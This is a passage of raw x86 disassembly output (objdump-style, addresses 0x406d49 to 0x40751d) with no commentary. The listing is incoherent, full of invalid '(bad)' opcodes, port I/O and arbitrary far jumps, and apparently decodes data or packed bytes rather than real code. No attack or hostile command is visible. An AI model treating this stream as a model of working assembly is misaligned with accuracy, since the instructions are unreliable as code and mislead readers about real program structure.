  406d49:	jge    0x406ce8
  406d4b:	jb     0x406db2
  406d4d:	xor    BYTE PTR [edx],0xa1
  406d50:	aaa    
  406d51:	jnp    0x406da6
  406d53:	ins    DWORD PTR es:[edi],dx
  406d54:	std    
  406d55:	dec    ebx
  406d56:	jno    0x406d17
  406d58:	pop    esi
  406d59:	sbb    BYTE PTR [esp+esi*2],0x20
  406d5d:	and    dl,BYTE PTR [edi]
  406d5f:	in     eax,dx
  406d60:	fimul  WORD PTR [eax]
  406d62:	xchg   DWORD PTR [ebx+eiz*2],edi
  406d65:	mov    cl,0xe5
  406d67:	cmp    DWORD PTR [eax+0x7da886b9],esp
  406d6d:	pop    edi
  406d6e:	xrelease lock and DWORD PTR [esi+ebx*2],edi
  406d73:	mov    ch,ah
  406d75:	repnz out dx,al
  406d77:	pop    esp
  406d78:	jp     0x406daa
  406d7a:	dec    ecx
  406d7b:	loopne 0x406d61
  406d7d:	jecxz  0x406d02
  406d7f:	fld    DWORD PTR [ebp+0x6614ee10]
  406d85:	ins    BYTE PTR es:[edi],dx
  406d86:	xor    DWORD PTR [ebp+0x32],esi
  406d89:	inc    edx
  406d8a:	add    bl,al
  406d8c:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  406d8e:	cs iret 
  406d90:	pop    ds
  406d91:	clc    
  406d92:	sub    al,0xf8
  406d94:	dec    ebp
  406d95:	sub    esi,ebx
  406d97:	mov    al,ds:0xe614ad01
  406d9c:	lods   eax,DWORD PTR ds:[esi]
  406d9d:	je     0x406d96
  406d9f:	or     DWORD PTR [esi+0x39],ebx
  406da2:	mov    edx,?
  406da4:	hlt    
  406da5:	pop    edx
  406da6:	xor    bl,BYTE PTR [ecx-0x41]
  406da9:	push   ecx
  406daa:	adc    eax,0x6eccfb89
  406daf:	jge    0x406dab
  406db1:	jo     0x406e31
  406db3:	fcomp  DWORD PTR [esi-0x40]
  406db6:	mov    ds:0xea15f12d,eax
  406dbb:	mov    esi,fs
  406dbd:	push   ecx
  406dbe:	xchg   ebx,eax
  406dbf:	adc    al,0x9e
  406dc1:	cmp    cl,ch
  406dc3:	lds    eax,FWORD PTR [ebp+esi*4+0x4a687caf]
  406dca:	and    al,0x4a
  406dcc:	inc    edi
  406dcd:	pop    edx
  406dce:	dec    esp
  406dcf:	cli    
  406dd0:	pop    ds
  406dd1:	ror    BYTE PTR [esi-0x54d3cb4],cl
  406dd7:	mov    eax,ds:0x1c2aaa7e
  406ddc:	mov    dh,0x11
  406dde:	sbb    ebx,DWORD PTR [ecx-0x5b]
  406de1:	xor    al,0xee
  406de3:	cmp    bl,dl
  406de5:	mov    al,0xeb
  406de7:	sahf   
  406de8:	arpl   WORD PTR [ecx-0x7bb24fd8],ax
  406dee:	mov    eax,ds:0x88dd5e1e
  406df3:	repnz test al,0xd8
  406df6:	push   ss
  406df7:	xchg   DWORD PTR [ebx+ebp*2+0x39],esp
  406dfb:	lods   eax,DWORD PTR ds:[esi]
  406dfc:	mov    bl,0xa0
  406dfe:	and    DWORD PTR cs:[edx-0x7a],0x849a446
  406e06:	popa   
  406e07:	sbb    ebx,DWORD PTR [edi+ebp*2+0x4e]
  406e0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e0c:	fbld   TBYTE PTR [edi-0x13]
  406e0f:	cli    
  406e10:	add    BYTE PTR [eax-0xe89b659],ch
  406e16:	push   ds
  406e17:	inc    edi
  406e18:	cld    
  406e19:	pusha  
  406e1a:	jecxz  0x406dc6
  406e1c:	(bad)  
  406e1d:	out    dx,eax
  406e1e:	fidivr DWORD PTR [esi]
  406e20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e21:	or     ebp,esp
  406e23:	xchg   edx,eax
  406e24:	sub    eax,edi
  406e26:	ror    BYTE PTR [esi+0x7453e0a6],1
  406e2c:	push   es
  406e2d:	adc    edx,ecx
  406e2f:	mov    al,ds:0xf824fc14
  406e34:	jns    0x406e44
  406e36:	into   
  406e37:	rcr    BYTE PTR [esi+0x23],1
  406e3a:	in     al,0x13
  406e3c:	pop    edx
  406e3d:	stos   BYTE PTR es:[edi],al
  406e3e:	adc    BYTE PTR [ebx+0x49],0x61
  406e42:	loope  0x406eb7
  406e44:	mov    al,ds:0x76ddcffc
  406e49:	data16 out dx,al
  406e4b:	(bad)
  406e4f:	pop    ebp
  406e50:	stos   BYTE PTR es:[edi],al
  406e51:	out    dx,eax
  406e52:	add    BYTE PTR [edi-0x5f0a0e3b],cl
  406e58:	xor    BYTE PTR [ebx-0x5],dh
  406e5b:	das    
  406e5c:	ins    DWORD PTR es:[edi],dx
  406e5d:	jns    0x406e4f
  406e5f:	stos   BYTE PTR es:[edi],al
  406e60:	pop    edi
  406e61:	add    ch,BYTE PTR [ebx]
  406e63:	xor    DWORD PTR [ecx],0x26762de9
  406e69:	ror    BYTE PTR fs:[edx-0x18ab6b22],1
  406e70:	std    
  406e71:	mov    ch,0x3b
  406e73:	mov    edi,0x87958a5d
  406e78:	fbstp  TBYTE PTR [eax]
  406e7a:	sar    DWORD PTR [ecx-0x5f1a0c12],0xe
  406e81:	sbb    edx,DWORD PTR [edx+0x1e]
  406e84:	mov    gs,esp
  406e86:	dec    edi
  406e87:	sub    bl,BYTE PTR [esi-0x69]
  406e8a:	jnp    0x406e79
  406e8c:	xchg   edi,eax
  406e8d:	adc    eax,DWORD PTR [ebx+esi*1+0x20]
  406e91:	popa   
  406e92:	mov    bh,0x85
  406e94:	adc    ch,0xb
  406e97:	outs   dx,DWORD PTR ds:[esi]
  406e98:	xor    DWORD PTR [eax],ecx
  406e9a:	out    dx,al
  406e9b:	in     eax,dx
  406e9c:	pop    ebp
  406e9d:	mov    eax,ds:0x923f47b
  406ea2:	shl    DWORD PTR [edi+0x627e4832],1
  406ea8:	inc    eax
  406ea9:	add    DWORD PTR [esi-0x11681edd],0x5e816819
  406eb3:	inc    esi
  406eb4:	fidiv  DWORD PTR [ecx]
  406eb6:	cmp    eax,0xdd607eed
  406ebb:	loope  0x406f1d
  406ebd:	add    BYTE PTR [edi-0x6],dh
  406ec0:	rcr    dl,0xf0
  406ec3:	inc    edi
  406ec4:	call   0x738198fd
  406ec9:	int    0xc5
  406ecb:	mov    ebx,0xc2b544b4
  406ed0:	and    esp,ecx
  406ed2:	add    ch,BYTE PTR [edi-0x5daf383c]
  406ed8:	mov    gs:0x5977ac22,eax
  406ede:	jo     0x406f03
  406ee0:	push   ds
  406ee1:	cmp    BYTE PTR [esi+0x4660c80e],bh
  406ee7:	mov    esi,0xe5b97e9c
  406eec:	(bad)  
  406eed:	call   0x7524afdf
  406ef2:	and    al,0x93
  406ef4:	inc    ebx
  406ef5:	push   esi
  406ef6:	pop    edx
  406ef7:	jmp    0xcae2d05e
  406efc:	adc    BYTE PTR [ecx-0x7f],ch
  406eff:	add    DWORD PTR [edi+edi*1],0xb1dc62ee
  406f06:	inc    ebx
  406f07:	xchg   BYTE PTR [edx+0x6af73465],cl
  406f0d:	pusha  
  406f0e:	mov    edi,0xa7f61294
  406f13:	or     esi,DWORD PTR [edx+0x2832551]
  406f19:	popa   
  406f1a:	sub    esi,DWORD PTR [ebx+0xc]
  406f1d:	data16 fmul QWORD PTR [edi]
  406f20:	out    dx,al
  406f21:	pusha  
  406f22:	cs mov bh,0xc5
  406f25:	xor    dx,WORD PTR [edi-0x531120b0]
  406f2c:	ins    BYTE PTR es:[edi],dx
  406f2d:	mov    esi,0xcc2ad702
  406f32:	into   
  406f33:	lock ret 
  406f35:	pop    edi
  406f36:	cmc    
  406f37:	addr16 aaa 
  406f39:	cmc    
  406f3a:	mov    ah,0x98
  406f3c:	test   BYTE PTR [eax-0x54a119dc],bh
  406f42:	pop    edx
  406f43:	mov    ch,0x69
  406f45:	js     0x406eec
  406f47:	ror    BYTE PTR ds:0xa9a89eb9,1
  406f4d:	mov    ebp,DWORD PTR [esi+0x28b0a43f]
  406f53:	ficomp DWORD PTR [edx-0x60]
  406f56:	out    dx,al
  406f57:	pop    eax
  406f58:	jae    0x406eeb
  406f5a:	dec    ecx
  406f5b:	rol    ch,1
  406f5d:	repz pop ebp
  406f5f:	jno    0x406f59
  406f61:	pusha  
  406f62:	xbegin 0x46cc8743
  406f68:	push   edi
  406f69:	imul   dh
  406f6b:	xchg   DWORD PTR [edx],esi
  406f6d:	dec    esp
  406f6e:	or     eax,0x35cc7692
  406f73:	mov    ds:0x59d4216,al
  406f78:	lock nop
  406f7a:	mov    bh,0x48
  406f7c:	push   ds
  406f7d:	mov    esi,0xdf6e5d1f
  406f82:	xchg   ecx,eax
  406f83:	(bad)  
  406f84:	outs   dx,DWORD PTR ds:[esi]
  406f85:	out    dx,al
  406f86:	mov    ds:0xf0a17ac5,al
  406f8b:	mov    al,ds:0x1f72c0d5
  406f90:	inc    esp
  406f91:	sub    eax,0x9f5ec0c5
  406f96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f97:	inc    edi
  406f98:	aaa    
  406f99:	cmp    dl,BYTE PTR [ebp+0x6615a21]
  406f9f:	aam    0x63
  406fa1:	fidiv  WORD PTR [ebx]
  406fa3:	inc    ebp
  406fa4:	sub    al,0x92
  406fa6:	out    dx,al
  406fa7:	or     ebp,DWORD PTR [esi]
  406fa9:	dec    ebp
  406faa:	xchg   BYTE PTR [ebx+0x28],cl
  406fad:	mov    cl,0x94
  406faf:	mov    eax,ds:0xce99725a
  406fb4:	shl    BYTE PTR [edi],0xf9
  406fb7:	je     0x407017
  406fb9:	test   DWORD PTR [ecx+0x5a],ecx
  406fbc:	xor    DWORD PTR [edi-0x63],ebx
  406fbf:	stc    
  406fc0:	punpcklwd mm6,DWORD PTR [edx+0x743da924]
  406fc7:	lds    edi,FWORD PTR [ebx-0x6e]
  406fca:	add    BYTE PTR [eax],bl
  406fcc:	xchg   ebp,eax
  406fcd:	jnp    0x40703d
  406fcf:	iret   
  406fd0:	and    DWORD PTR [esi-0x6d],ebx
  406fd3:	out    dx,al
  406fd4:	and    al,0x61
  406fd6:	shl    DWORD PTR [eax],cl
  406fd8:	pop    ds
  406fd9:	jae    0x406f82
  406fdb:	xchg   ebp,eax
  406fdc:	dec    ebx
  406fdd:	jns    0x407033
  406fdf:	loop   0x40703f
  406fe1:	cdq    
  406fe2:	stos   BYTE PTR es:[edi],al
  406fe3:	ret    
  406fe4:	pop    esp
  406fe5:	shr    BYTE PTR [ebx+edx*2-0x5d],1
  406fe9:	pop    edi
  406fea:	sbb    BYTE PTR [esi+0x56],bh
  406fed:	call   0xb5127ea3
  406ff2:	int    0xb9
  406ff4:	pop    esi
  406ff5:	xchg   edi,eax
  406ff6:	gs xchg ebp,eax
  406ff8:	sbb    BYTE PTR [eax+0x5a],dh
  406ffb:	adc    esi,ebp
  406ffd:	inc    ecx
  406ffe:	adc    DWORD PTR [edi+0x35],edi
  407001:	popa   
  407002:	rol    DWORD PTR cs:[esi+0x5ed6056c],0x3f
  40700a:	jge    0x40703b
  40700c:	in     al,0x94
  40700e:	cmp    al,0xda
  407010:	(bad)  
  407011:	dec    esp
  407012:	inc    ecx
  407013:	cdq    
  407014:	cwde   
  407015:	leave  
  407016:	out    dx,al
  407017:	das    
  407018:	lea    ecx,[edx]
  40701a:	mov    DWORD PTR [edi-0x730fbc60],ecx
  407020:	adc    ebx,DWORD PTR [eax+0x31d1e0b9]
  407026:	call   0x73a1:0xa0baff45
  40702d:	pop    esi
  40702e:	inc    esp
  40702f:	add    bl,al
  407031:	in     eax,dx
  407032:	pop    eax
  407033:	push   edi
  407034:	pop    esi
  407035:	push   esi
  407036:	outs   dx,DWORD PTR ds:[esi]
  407037:	cmp    ah,BYTE PTR [edx+0x0]
  40703a:	sbb    dl,ah
  40703c:	cmp    bh,BYTE PTR [ecx+0x3ffaaf65]
  407042:	outs   dx,BYTE PTR ds:[esi]
  407043:	dec    edi
  407044:	aam    0x10
  407046:	data16 das 
  407048:	out    dx,eax
  407049:	xchg   esp,eax
  40704a:	hlt    
  40704b:	addr16 add eax,0x5d829918
  407051:	mov    al,0x43
  407053:	mov    ecx,0x8d2e7a5b
  407058:	shl    DWORD PTR [eax+0x58],0xee
  40705c:	sbb    esi,DWORD PTR [edx-0x32]
  40705f:	dec    ecx
  407060:	mov    ecx,0x5eb9e4ae
  407065:	push   ds
  407066:	fcmovne st,st(3)
  407068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407069:	or     al,0x30
  40706b:	cmc    
  40706c:	lock mov edx,0x6c5b9fe9
  407072:	imul   esi,DWORD PTR [ebp-0x1d9b9f2f],0x67fe0495
  40707c:	and    al,BYTE PTR [ebp-0x67]
  40707f:	mov    eax,ds:0x60c85e66
  407084:	push   cs
  407085:	adc    BYTE PTR [ebx-0x5f],0xcf
  407089:	(bad)  
  40708b:	xor    DWORD PTR [edi+0x40],ecx
  40708e:	inc    edi
  40708f:	(bad)  
  407090:	js     0x4070d4
  407092:	lock cld 
  407094:	and    eax,0x4ee1645b
  407099:	gs leave 
  40709b:	lea    esi,[edx+eiz*1-0x408d26d0]
  4070a2:	out    dx,al
  4070a3:	cmp    eax,0x7850247b
  4070a8:	and    eax,0xc494eedb
  4070ad:	adc    eax,ebp
  4070af:	push   esp
  4070b0:	jmp    0x7a5f:0xa0ee4cc6
  4070b7:	pop    eax
  4070b8:	dec    esp
  4070b9:	in     eax,0xdf
  4070bb:	add    al,0xfb
  4070bd:	xchg   esp,eax
  4070be:	nop
  4070bf:	jl     0x407140
  4070c1:	and    esi,ebp
  4070c3:	test   BYTE PTR [esp+esi*1],cl
  4070c6:	sbb    eax,0x1a60f142
  4070cb:	sbb    DWORD PTR [ecx+0x16615ebd],ebp
  4070d1:	iret   
  4070d2:	out    dx,al
  4070d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070d4:	sbb    BYTE PTR [esi-0x375006a8],dh
  4070da:	sub    eax,0xee62bac9
  4070df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070e0:	repnz inc edx
  4070e2:	mov    al,ds:0xeede983a
  4070e7:	bswap  esp
  4070e9:	sti    
  4070ea:	xchg   DWORD PTR [eax+0x5],ebx
  4070ed:	(bad)  
  4070ee:	hlt    
  4070ef:	scas   al,BYTE PTR es:[edi]
  4070f0:	and    cl,BYTE PTR [ebx-0x226c0e92]
  4070f6:	xchg   ecx,eax
  4070f7:	xchg   edi,eax
  4070f8:	(bad)  
  4070f9:	scas   al,BYTE PTR es:[edi]
  4070fa:	pusha  
  4070fb:	enter  0x705e,0x8a
  4070ff:	test   al,0x5d
  407101:	adc    BYTE PTR [ebx-0x45],dh
  407104:	xchg   esi,eax
  407105:	pusha  
  407106:	push   ecx
  407107:	mov    eax,0x20ca7cac
  40710c:	mov    bh,0xd6
  40710e:	out    dx,al
  40710f:	call   0xf167:0x426c6c02
  407116:	mov    DWORD PTR [ebp+0x2f],edi
  407119:	popa   
  40711a:	or     al,0x44
  40711c:	xor    al,0xda
  40711e:	pop    edx
  40711f:	aas    
  407120:	xor    bl,BYTE PTR [edx-0x4e41911d]
  407126:	inc    ecx
  407127:	xchg   ecx,eax
  407128:	pop    esi
  407129:	mov    bl,bh
  40712b:	cmc    
  40712c:	popa   
  40712d:	sahf   
  40712e:	fmul   DWORD PTR [edi+0x7a5c60fd]
  407134:	mov    dl,dh
  407136:	jge    0x407142
  407138:	mov    ds:0xf8f8ee6f,eax
  40713d:	xchg   DWORD PTR [edx],ebp
  40713f:	mov    edx,0x10decaf4
  407144:	mov    fs,WORD PTR [eax+0x24]
  407147:	int    0xd9
  407149:	sar    BYTE PTR [edi],1
  40714b:	jmp    FWORD PTR [esi+0x7be0eee7]
  407151:	mov    ebx,DWORD PTR [eax+ebp*2]
  407154:	and    al,0x22
  407156:	das    
  407157:	mov    eax,ds:0x2cba6c39
  40715c:	sahf   
  40715d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40715e:	and    DWORD PTR ds:0xad64e65e,0x7
  407165:	dec    esi
  407166:	add    al,0xc5
  407168:	mov    fs,WORD PTR [eax+0x10]
  40716b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40716c:	stc    
  40716d:	ror    BYTE PTR [eax],cl
  40716f:	lahf   
  407170:	test   dh,0xe6
  407173:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407174:	aaa    
  407175:	aaa    
  407176:	mov    di,0x404
  40717a:	out    dx,al
  40717b:	adc    DWORD PTR [edx+0x5825a11],esi
  407181:	pusha  
  407182:	mov    ecx,0x648ba69b
  407187:	das    
  407188:	hlt    
  407189:	mov    edi,es
  40718b:	call   0x8bf5602
  407190:	pop    edx
  407191:	das    
  407192:	or     bl,dl
  407194:	inc    esp
  407195:	push   sp
  407197:	(bad)  
  407198:	cld    
  407199:	mov    bh,0xf7
  40719b:	jo     0x4071aa
  40719d:	out    dx,al
  40719e:	add    ah,ah
  4071a0:	ror    bl,cl
  4071a2:	stos   DWORD PTR es:[edi],eax
  4071a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071a4:	mov    ebp,0xce4911c5
  4071a9:	add    DWORD PTR ds:0x496e3a1,ebp
  4071af:	mov    ebp,0xe5f04b1
  4071b4:	pop    esi
  4071b5:	pop    ebx
  4071b6:	fwait
  4071b7:	xor    eax,0x50c05ce4
  4071bc:	outs   dx,BYTE PTR ds:[esi]
  4071bd:	pop    ebp
  4071be:	nop
  4071bf:	gs sub eax,0xd6a4868f
  4071c5:	mov    dh,0xd2
  4071c7:	fdivr  QWORD PTR [ebx-0x68]
  4071ca:	ret    0x5e9a
  4071cd:	mov    ebx,ecx
  4071cf:	(bad)  
  4071d0:	sub    edx,DWORD PTR [esi+0x51c524ec]
  4071d6:	pop    ebx
  4071d7:	(bad)  
  4071d8:	inc    ebx
  4071d9:	shr    BYTE PTR [esi+0x1],1
  4071dc:	mov    ch,0x54
  4071de:	push   DWORD PTR [ecx+0x1a127960]
  4071e4:	aaa    
  4071e5:	aaa    
  4071e6:	push   eax
  4071e7:	loope  0x407197
  4071e9:	pushf  
  4071ea:	test   BYTE PTR [ebp-0x77119d88],ch
  4071f0:	sbb    ecx,DWORD PTR [ebx-0x79cf726a]
  4071f6:	out    dx,al
  4071f7:	in     eax,0x2e
  4071f9:	and    eax,0x73836aa6
  4071fe:	mov    ebp,0x62da8a7d
  407203:	icebp  
  407204:	pop    ebx
  407205:	arpl   bx,cx
  407207:	push   ds
  407208:	fidivr WORD PTR [edx]
  40720a:	jmp    0x5e72:0x3d810b95
  407211:	(bad)  
  407212:	test   eax,0xf8604e81
  407217:	jb     0x4071ed
  407219:	pop    ebp
  40721a:	test   al,cl
  40721c:	jle    0x40726b
  40721e:	rol    bl,cl
  407220:	fidiv  WORD PTR [edi-0x587d8d3]
  407226:	bnd jmpw 0x1002
  40722b:	fbstp  TBYTE PTR [edx-0x415e9054]
  407231:	es pop edx
  407233:	shr    DWORD PTR [esi+0x525306f8],cl
  407239:	repnz or dh,BYTE PTR [ebp+0x4aeed144]
  407240:	push   ss
  407241:	sub    eax,0x60699d83
  407246:	add    edx,ebp
  407248:	leave  
  407249:	(bad)  
  40724a:	mov    es,WORD PTR [eax+0x5aeb99ef]
  407250:	mov    edx,0x3bd93fb0
  407255:	mov    eax,ds:0x67d139b4
  40725a:	sbb    BYTE PTR [ecx],ch
  40725c:	pop    esi
  40725d:	push   ecx
  40725e:	(bad)  
  40725f:	lock in eax,0x4d
  407262:	mov    eax,ds:0x8f7731c1
  407267:	and    DWORD PTR [esi-0x3fb035d2],eax
  40726d:	(bad)  
  40726e:	cmc    
  40726f:	mov    ds:0x18a5a389,eax
  407274:	int3   
  407275:	fwait
  407276:	cs gs push ebx
  407279:	jnp    0x407269
  40727b:	add    esi,DWORD PTR [edi]
  40727d:	push   edi
  40727e:	gs imul ecx,ebp,0x2f
  407282:	and    eax,0x2e151fa8
  407287:	dec    BYTE PTR [edi+0x96139c9]
  40728d:	xchg   esi,eax
  40728e:	push   edx
  40728f:	rcr    DWORD PTR [ebp+0x3e],1
  407292:	or     eax,0xf1875bee
  407297:	dec    ebx
  407298:	mov    ds:0x6fa142ce,al
  40729d:	adc    al,0x2c
  40729f:	outs   dx,BYTE PTR ds:[esi]
  4072a0:	sti    
  4072a1:	and    eax,0xa8aebabc
  4072a6:	out    dx,al
  4072a7:	lea    ecx,[ebx+ecx*1+0x64b21312]
  4072ae:	in     al,0xa0
  4072b0:	rol    DWORD PTR [ebp-0x6a2bdb5d],1
  4072b6:	mov    ah,0x30
  4072b8:	pop    edi
  4072b9:	ss xchg edi,eax
  4072bb:	ficomp DWORD PTR [ecx]
  4072bd:	push   edx
  4072be:	lods   al,BYTE PTR ds:[esi]
  4072bf:	inc    eax
  4072c0:	adc    al,0x39
  4072c2:	cld    
  4072c3:	out    dx,al
  4072c4:	popf   
  4072c5:	cmp    DWORD PTR [bp+si-0x4122],edx
  4072ca:	arpl   WORD PTR [edi+0x6a],dx
  4072cd:	rol    DWORD PTR [eax],1
  4072cf:	pop    es
  4072d0:	aaa    
  4072d1:	adc    al,0xec
  4072d3:	push   cs
  4072d4:	inc    ebp
  4072d5:	and    BYTE PTR [edi+0x5a],0x13
  4072d9:	adc    DWORD PTR [esi-0x2d],edi
  4072dc:	push   edi
  4072dd:	int    0x26
  4072df:	mov    eax,ds:0xc82f5b0a
  4072e4:	fcmovbe st,st(4)
  4072e6:	push   ebp
  4072e7:	sti    
  4072e8:	pop    esi
  4072e9:	dec    edx
  4072ea:	retf   
  4072eb:	mov    bl,0x62
  4072ed:	push   cs
  4072ee:	loop   0x407348
  4072f0:	dec    esp
  4072f1:	popa   
  4072f2:	add    al,dl
  4072f4:	adc    DWORD PTR [ebx+0x7],0xeddcc16c
  4072fb:	jmp    0x48aa:0x8e40d860
  407302:	inc    edx
  407303:	fwait
  407304:	lea    esp,[eax+0x37]
  407307:	sbb    ebx,DWORD PTR [edx]
  407309:	mov    edi,0xa2354a1e
  40730e:	fidivr DWORD PTR [esi+0x5f]
  407311:	mov    esp,0x27c80ba
  407316:	mov    BYTE PTR [ecx],bl
  407318:	loop   0x407317
  40731a:	mov    ch,BYTE PTR [edx+0x13eb41f2]
  407320:	pop    ebx
  407321:	push   0x64
  407323:	fidivr WORD PTR [esi+0x5dee1828]
  407329:	xchg   esi,eax
  40732a:	shl    DWORD PTR [ecx+0x23],0xdd
  40732e:	les    eax,FWORD PTR [ecx-0x2]
  407331:	stc    
  407332:	dec    ebx
  407333:	stos   DWORD PTR es:[edi],eax
  407334:	loop   0x40732e
  407336:	out    dx,al
  407337:	aad    0x94
  407339:	loope  0x4073a3
  40733b:	test   DWORD PTR [ebp+0x5f7260b3],0xdb9c1820
  407345:	mov    al,ds:0x1bfc6182
  40734a:	imul   esp,DWORD PTR [ecx-0x3b0e6df0],0x87abfad5
  407354:	pop    esi
  407355:	in     eax,0x98
  407357:	in     eax,0x5c
  407359:	std    
  40735a:	fwait
  40735b:	aam    0xcc
  40735d:	pop    edi
  40735e:	fldcw  WORD PTR ds:0x8df372ec
  407364:	jge    0x407321
  407366:	test   eax,0xeeba0c74
  40736b:	mov    dh,0x9a
  40736d:	push   esp
  40736e:	into   
  40736f:	mov    WORD PTR [ecx-0x85f0556],cs
  407375:	mov    ebp,0xd3a0febd
  40737a:	jl     0x407367
  40737c:	push   0x69
  40737e:	out    dx,al
  40737f:	mov    ch,ch
  407381:	mov    bl,BYTE PTR [ecx-0x73]
  407384:	mov    ebp,DWORD PTR [eax+0x43b0a193]
  40738a:	push   esp
  40738b:	dec    eax
  40738c:	aam    0x23
  40738e:	rol    ch,0x5e
  407391:	cmp    BYTE PTR [esi],dl
  407393:	rol    DWORD PTR [eax],1
  407395:	and    DWORD PTR [eax-0x63],0x73
  407399:	fs (bad) 
  40739b:	fimul  WORD PTR ds:0xe6ae39bc
  4073a2:	sbb    al,0x48
  4073a4:	clc    
  4073a5:	das    
  4073a6:	in     al,dx
  4073a7:	in     eax,dx
  4073a8:	(bad)  
  4073a9:	sbb    DWORD PTR [edx-0x50bf4acf],esi
  4073af:	cmp    ch,BYTE PTR [ecx+0x60]
  4073b2:	mov    edi,0x3d440100
  4073b7:	lods   eax,DWORD PTR ds:[esi]
  4073b8:	rol    DWORD PTR [esi-0x56281e12],1
  4073be:	stos   DWORD PTR es:[edi],eax
  4073bf:	fldcw  WORD PTR [ebx+0x2a0dde7]
  4073c5:	arpl   WORD PTR [esi+0x28],di
  4073c8:	inc    esi
  4073c9:	add    bl,BYTE PTR [ebx-0x30c7a5fd]
  4073cf:	add    BYTE PTR [eax+ebp*1+0x2e],al
  4073d3:	xchg   BYTE PTR [ebx],ah
  4073d5:	and    ah,BYTE PTR [ebx-0x58]
  4073d8:	aaa    
  4073d9:	pop    es
  4073da:	stc    
  4073db:	mov    edi,0x2161c16b
  4073e0:	ret    0x49e8
  4073e3:	lds    esp,FWORD PTR [ecx+0x78]
  4073e6:	out    dx,al
  4073e7:	lods   al,BYTE PTR ds:[esi]
  4073e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073e9:	lods   al,BYTE PTR ds:[esi]
  4073ea:	in     al,0x86
  4073ec:	jmp    DWORD PTR [ebx+0x44bfa0d4]
  4073f2:	bound  edx,QWORD PTR es:[ebx]
  4073f5:	push   cs
  4073f6:	loope  0x40742b
  4073f8:	pop    esi
  4073f9:	dec    edx
  4073fa:	sbb    al,0x5c
  4073fc:	dec    eax
  4073fd:	push   ecx
  4073fe:	xor    al,0xe2
  407400:	ins    DWORD PTR es:[edi],dx
  407401:	pusha  
  407402:	mov    WORD PTR [ecx-0x68],ss
  407405:	and    DWORD PTR gs:[eax+0x7f],edi
  407409:	aad    0xee
  40740b:	out    0xb5,al
  40740d:	retf   0x47bb
  407410:	or     eax,DWORD PTR [ebp-0x32ac727a]
  407416:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407417:	loope  0x407419
  407419:	(bad)  
  40741a:	std    
  40741b:	jo     0x407458
  40741d:	push   ebp
  40741e:	loop   0x40742f
  407420:	imul   eax,DWORD PTR [ecx+ebx*2-0x739a21c],0x45
  407428:	mov    bl,0xe5
  40742a:	cmc    
  40742b:	mov    ebp,0xa0e3ed8e
  407430:	mov    esi,0x7428e45a
  407435:	mov    esi,0xaff11535
  40743a:	and    ah,BYTE PTR [esi+ebp*8]
  40743d:	(bad)  
  40743e:	icebp  
  40743f:	dec    esp
  407440:	fsubrp st(1),st
  407442:	fnstenv [edx]
  407444:	xor    ch,BYTE PTR [ecx+0x55]
  407447:	in     al,dx
  407448:	pop    ds
  407449:	jne    0x4073e1
  40744b:	mov    dh,BYTE PTR [ebx+0x74]
  40744e:	jmp    DWORD PTR [ecx-0x1ee83b3e]
  407454:	outs   dx,BYTE PTR ds:[esi]
  407455:	jg     0x407400
  407457:	jno    0x4074af
  407459:	jbe    0x407489
  40745b:	mov    eax,ds:0xa1e1af86
  407460:	scas   al,BYTE PTR es:[edi]
  407461:	or     BYTE PTR [ecx-0x303770b3],dh
  407467:	add    dh,bh
  407469:	jp     0x407459
  40746b:	arpl   WORD PTR [edi],sp
  40746d:	mov    edx,0x2f8cb66d
  407472:	jge    0x407416
  407474:	jle    0x40742b
  407476:	je     0x407488
  407478:	js     0x407495
  40747a:	ins    BYTE PTR es:[edi],dx
  40747b:	dec    ecx
  40747c:	push   ebp
  40747d:	pop    ds
  40747e:	xchg   BYTE PTR [ebx],bl
  407480:	jle    0x40743b
  407482:	into   
  407483:	lods   eax,DWORD PTR ds:[esi]
  407484:	sahf   
  407485:	mov    ebx,0x435a5008
  40748a:	fisttp DWORD PTR [ebx-0x22]
  40748d:	xchg   edi,eax
  40748e:	xor    dh,dh
  407490:	pop    esi
  407491:	mov    ebx,0x3a1a9115
  407496:	out    dx,al
  407497:	test   BYTE PTR [eax-0x6],dh
  40749a:	or     esp,eax
  40749c:	sub    DWORD PTR [edi+0x1a],esp
  40749f:	mov    eax,ds:0x29db96fe
  4074a4:	mov    bh,0xab
  4074a6:	xor    eax,0x8efc5eaf
  4074ab:	(bad)
  4074ae:	and    bh,BYTE PTR [ebx-0x5c]
  4074b1:	pusha  
  4074b2:	jae    0x407483
  4074b4:	inc    edx
  4074b5:	ret    0xdbba
  4074b8:	mov    dh,0xbf
  4074ba:	xlat   BYTE PTR ds:[ebx]
  4074bb:	cmp    dh,cl
  4074bd:	das    
  4074be:	in     eax,dx
  4074bf:	shr    BYTE PTR [eax+0x1b6208e0],cl
  4074c5:	in     al,dx
  4074c6:	ds add esp,ebx
  4074c9:	pusha  
  4074ca:	pop    esp
  4074cb:	ret    
  4074cc:	dec    esi
  4074cd:	test   DWORD PTR [esi],0xff9bfe2a
  4074d3:	test   dh,cl
  4074d5:	pop    eax
  4074d6:	scas   al,BYTE PTR es:[edi]
  4074d7:	jno    0x40751c
  4074d9:	cld    
  4074da:	and    DWORD PTR [edi-0x999f41],edx
  4074e0:	mov    cl,0x41
  4074e2:	jb     0x4074bf
  4074e4:	sub    ch,cl
  4074e6:	out    dx,al
  4074e7:	mov    ds:0xa530211c,eax
  4074ec:	jmp    0xe071:0xaba1324d
  4074f3:	andps  xmm1,XMMWORD PTR [edx+0x3a366d58]
  4074fa:	mov    edx,0x932fc620
  4074ff:	inc    bl
  407501:	inc    esp
  407502:	mov    bh,0x7a
  407504:	xor    BYTE PTR [ecx+0x6d],ah
  407507:	or     al,ah
  407509:	mov    edx,0x77785761
  40750e:	out    dx,al
  40750f:	cmp    BYTE PTR [esi+0xe],ah
  407512:	jecxz  0x4074c2
  407514:	dec    esp
  407515:	sub    al,0xa8
  407517:	mov    gs,WORD PTR [ecx+0x4d6144d7]
  40751d:	dec    edi
